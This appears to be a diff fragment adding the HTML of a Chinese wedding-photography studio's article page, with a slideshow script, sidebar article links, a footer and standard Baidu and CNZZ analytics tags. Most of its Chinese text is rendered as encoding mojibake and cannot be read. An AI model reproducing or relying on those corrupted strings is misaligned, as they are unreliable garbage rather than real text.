+                    document.write("<div class='div_jimg\'><a class='a_jimg' id='a_jimg' href='"+lnkarry[0]+"' title='' style='background:url("+picarry[1]+")' target='_blank'><img id='bigimg' style='filter:RevealTrans (duration='1',transition='23'); visibility:visible;' alt='' src='"+picarry[0]+"'><\/a><ul class='ul_jimg'><li class='li_jimg on' id='li_jimg0' onmouseover='setfoc(0)' onmouseout='playit()'><a href='"+lnkarry[0]+"' target='_blank' class='img'>"+ttlarry[0]+"<\/a><\/li><li class='li_jimg' id='li_jimg1' onmouseover='setfoc(1)' onmouseout='playit()'><a href='"+lnkarry[1]+"' target='_blank' class='img'>"+ttlarry[1]+"<\/a><\/li><li class='li_jimg' id='li_jimg2' onmouseover='setfoc(2)' onmouseout='playit()'><a href='"+lnkarry[2]+"' target='_blank' class='img'>"+ttlarry[2]+"<\/a><\/li><li class='li_jimg' id='li_jimg3' onmouseover='setfoc(3)' onmouseout='playit()'><a href='"+lnkarry[3]+"' target='_blank' class='img'>"+ttlarry[3]+"<\/a><\/li><li class='li_jimg' id='li_jimg4' onmouseover='setfoc(4)' onmouseout='playit()'><a href='"+lnkarry[4]+"' target='_blank' class='img'>"+ttlarry[4]+"<\/a><\/li><li class='li_jimg' id='li_jimg5' onmouseover='setfoc(5)' onmouseout='playit()'><a href='"+lnkarry[5]+"' target='_blank' class='img'>"+ttlarry[5]+"<\/a><\/li><\/ul><\/div>");
+-->
+</SCRIPT>
+</DIV></div>
+<div class="dy_con">
+  <div class="dy_con_l">
+    <div class="dy_con_l_01"> <span style="float:left;"><img src="images/dy_t01.jpg" /></span> <span style="float:left; width:243px; height:203px; padding-top:11px; background:#9c920a;">
+  
+ <a href="info.asp?id=17" target="_blank" class="dy_01">��ɴ��Ӱ</a>
+ 
+ <a href="info.asp?id=18" target="_blank" class="dy_01">�鳵����</a>
+ 
+ <a href="info.asp?id=19" target="_blank" class="dy_01">��ױ����</a>
+ 
+ <a href="info.asp?id=20" target="_blank" class="dy_01">ʱ�л���</a>
+ 
+ <a href="info.asp?id=21" target="_blank" class="dy_01">�������</a>
+ 
+ <a href="info.asp?id=42" target="_blank" class="dy_01">����ǣ��~</a>
+ 
+ <a href="info.asp?id=43" target="_blank" class="dy_01">��������</a>
+ 
+ <a href="info.asp?id=45" target="_blank" class="dy_01">�������Ư���Ķ������</a>
+ 
+ <a href="info.asp?id=46" target="_blank" class="dy_01">������ױע������</a>
+ 
+ <a href="info.asp?id=47" target="_blank" class="dy_01">�����ļ�����ױ��ע������</a>
+ 
+ <a href="info.asp?id=48" target="_blank" class="dy_01">�����＾��θ�����ˮ</a>
+ 
+ </span></div>
+    <div class="dy_con_l_02"> <span style="float:left;"><img src="images/dy_t02.jpg" /></span> <span style="float:left; width:243px; height:255px; padding-top:15px; background:#9c920a;">
+	 
+      <div class="dy_ti"><a href="info.asp?id=1061" target="_blank" class="dy_02">���ݸ�A1��-Ψ��������ӳ...</a></div>
+  
+      <div class="dy_ti"><a href="info.asp?id=1060" target="_blank" class="dy_02">����ǰ�����������ʲô...</a></div>
+  
+      <div class="dy_ti"><a href="info.asp?id=1059" target="_blank" class="dy_02">����֮��ע������...</a></div>
+  
+      <div class="dy_ti"><a href="info.asp?id=1058" target="_blank" class="dy_02">��������������������ʤ��...</a></div>
+  
+      <div class="dy_ti"><a href="info.asp?id=1057" target="_blank" class="dy_02">��������̨�������е�10����...</a></div>
+  
+      <div class="dy_ti"><a href="info.asp?id=1056" target="_blank" class="dy_02">����"����"���...</a></div>
+  
+      <div class="dy_ti"><a href="info.asp?id=1055" target="_blank" class="dy_02">����֮������� "����"...</a></div>
+  
+      <div class="dy_ti"><a href="info.asp?id=1054" target="_blank" class="dy_02">�����ر��������...</a></div>
+  
+      </span> </div>
+  </div>
+  <div class="dy_con_r_t" style="background:url(images/dya.jpg)"> <span style="float:right; width:240px; height:22px; padding:24px 0px 0px 0px;">���ĵ�ǰλ�ã�<a href="index.asp" class="d">�Ϸʻ�����ҳ</a> >> <a href="news.asp?lid=" class="d"></a></span> </div>
+  <div class="dy_con_r_c">
+   <div style="text-align:center; font-size:16px; font-weight:bold; padding-top:20px;"><hr style="width:98%;" color="#FFFFFF"></div>
+   <div style="text-align:center;">�������ڣ��������������� ��</div>
+   <div class="nei"></div>
+   
+  </div>
+  <div class="dy_con_r_d"></div>
+</div>
+<div id="foor">
+   <div class="foor_01">
+        <a href="about.asp?n=gsjj" class="d">��������</a> |�
+        <a href="news.asp?lid=1" class="d">ʱ����Ѷ</a> |�
+        <a href="news.asp?lid=8" class="d">������Ŀ</a> |�
+        <a href="news.asp?lid=7" class="d">�����ײ�</a> |�
+        <a href="pro.asp?lid=24" class="d">���ʳ���</a> |�
+        <a href="about.asp?n=lxwm" class="d">��ϵ����</a>
+   </div>
+   <div class="foor_02">
+     <span style="float:left; width:600px; height:22px; padding-left:365px; padding-top:8px;">Copyright � 2007-2012 �Ϸ��������鴴��������޹�˾</span>
+     <span style="float:left; width:600px; height:22px; padding-left:365px;">��ַ������ʡ�Ϸ����ٴ�·�뺬ɽ·��������4F��¥���������鴴�����</span>
+	 <span style="float:left; width:600px; height:22px; padding-left:365px;">�绰��0551��62625238�������䣺NMxinqing@163.com ��<!-- hisweet.com Baidu tongji analytics -->
+<script type="text/javascript">
+var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3F183d55262f38db14ca2b73f42f2d11ec' type='text/javascript'%3E%3C/script%3E"));
+</script>
+<script src="http://s13.cnzz.com/stat.php?id=3795585&web_id=3795585&show=pic" language="JavaScript"></script>
+
+</span>
+   </div>
+</div>
+
+</body>
+</html>
+
+############################################################################
+
